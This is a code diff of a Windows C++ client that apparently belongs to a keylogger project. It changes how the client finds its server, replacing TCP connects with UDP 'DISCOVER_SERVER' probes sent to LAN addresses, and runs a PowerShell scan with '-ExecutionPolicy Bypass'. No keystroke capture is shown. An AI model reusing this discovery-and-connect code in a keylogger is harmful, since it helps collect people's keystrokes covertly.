@@ -15,6 +15,7 @@
 #endif
 #include "keylogger.hpp"
 #define PORT 50000
+#define PORT1 52000
 #define BROADCAST_IP "255.255.255.255"
 std::atomic<bool> running(false);
 
@@ -43,56 +44,86 @@ void runScript(const std::string &scriptPath) {
     }
 }
 
-ULONG scanForServer(){
+ULONG scanForServer() {
     struct sockaddr_in broadcastAddr, recvAddr;
     socklen_t addrLen = sizeof(recvAddr);
+    
     runScript("pwsh -ExecutionPolicy Bypass -File .\\scripts\\scanLAN.ps1");
-    SOCKET clientFD = socket(AF_INET, SOCK_STREAM, 0);
+
+    SOCKET clientFD = socket(AF_INET, SOCK_DGRAM, 0);
     if (clientFD < 0) {
         std::cerr << "Failed to create server socket\n";
+        exit(1);
+    }
+
+    timeval timeout;
+    timeout.tv_sec = 2;  
+    timeout.tv_usec = 0; 
+
+    if (setsockopt(clientFD, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) < 0) {
+        std::cerr << "Failed to set socket timeout\n";
+        closesocket(clientFD);
+        WSACleanup();
         exit(1);
     }
 
     char buffer[1024];
     std::vector<std::string> output;
 
-    FILE*  file = fopen("./ipaddress.txt","r");
-    if(file == NULL){
+    FILE* file = fopen("./ipaddress.txt", "r");
+    if (file == NULL) {
         std::cerr << "Failed to open file\n";
         exit(1);
     }
-    int count = 0;
-    for(count = 0; ;count++){
-        if(fgets(buffer,1024,file) ==NULL){
-            break;
-        }
+
+    while (fgets(buffer, sizeof(buffer), file)) {
+        buffer[strcspn(buffer, "\n")] = '\0';
         output.push_back(buffer);
     }
     fclose(file);
 
-    // Since the tester restarts your program quite often, setting SO_REUSEADDR
-    // ensures that we don't run into 'Address already in use' errors
     int broadcast = 1;
     if (setsockopt(clientFD, SOL_SOCKET, SO_REUSEADDR, (const char*)&broadcast, sizeof(broadcast)) < 0) {
         std::cerr << "setsockopt failed\n";
         exit(1);
     }
-    for(int i = 0 ; i < count ; i ++){
+
+    for (size_t i = 0; i < output.size(); ++i) {
         broadcastAddr.sin_family = AF_INET;
-        broadcastAddr.sin_addr.s_addr = inet_addr(output[i].c_str());
-        broadcastAddr.sin_port = htons(PORT);
-        std::cout<<"Sending discovery message to ip address "<<inet_ntoa(broadcastAddr.sin_addr)<<"\n";
-        if(connect(clientFD, (struct sockaddr *)&broadcastAddr, sizeof(broadcastAddr)) >= 0){
-            std::cout<<"Connected to server at ip address"<<inet_ntoa(broadcastAddr.sin_addr)<<"\n";
-            break;
+        broadcastAddr.sin_addr.s_addr = inet_addr(output[i].c_str());  
+        broadcastAddr.sin_port = htons(PORT1);
 
-        } else{
-            std::cerr << "Failed to connect to server\n";
+
+        std::cout << "Sending discovery message to IP address " << output[i] << "\n";
+        
+        const char* message = "DISCOVER_SERVER";
+        //DISCOVER_SERVER
+        int sendResult = sendto(clientFD, message, strlen(message), 0, (struct sockaddr*)&broadcastAddr, sizeof(broadcastAddr));
+        if (sendResult == SOCKET_ERROR) {
+            std::cerr << "Failed to send message to " << output[i] << "\n";
+            continue;
         }
-    }
-    return broadcastAddr.sin_addr.s_addr;
 
+        char recvBuffer[1024];
+        int recvResult = recvfrom(clientFD, recvBuffer, sizeof(recvBuffer), 0, (struct sockaddr*)&recvAddr, &addrLen);
+        if (recvResult == SOCKET_ERROR) {
+            if (WSAGetLastError() == WSAETIMEDOUT) {
+                std::cerr << "Timeout waiting for response from " << output[i] << "\n";
+            } else {
+                std::cerr << "Failed to receive response from " << output[i] << "\n";
+            }
+        } else {
+            std::cout << "Received response from " << output[i] << "\n";
+            break;
+        }
+
+    }
+
+    return broadcastAddr.sin_addr.s_addr;
 }
+
+
+
 SOCKET setupSocket() {
     SOCKET clientFD = socket(AF_INET, SOCK_STREAM, 0);
     if (clientFD < 0) {
@@ -122,6 +153,8 @@ void sendDiscoveryMessage(SOCKET clientFD, ULONG serverAddr) {
 
     if (connect(clientFD, (struct sockaddr *)&broadcastAddr, sizeof(broadcastAddr)) < 0) {
         std::cerr << "Failed to connect to server\n";
+        int errCode = WSAGetLastError();
+        std::cerr << "Socket operation failed with error code: " << errCode << "\n";
         closesocket(clientFD);
         WSACleanup();
         exit(1);
@@ -144,6 +177,8 @@ int main(int argc, char **argv) {
         return 1;
     }
     ULONG serverAddr =  scanForServer();
+    std::cout<<"found server"<<std::endl;
+    Sleep(1000); 
     sendDiscoveryMessage(clientFD,serverAddr);
     char buffer[1024];
 
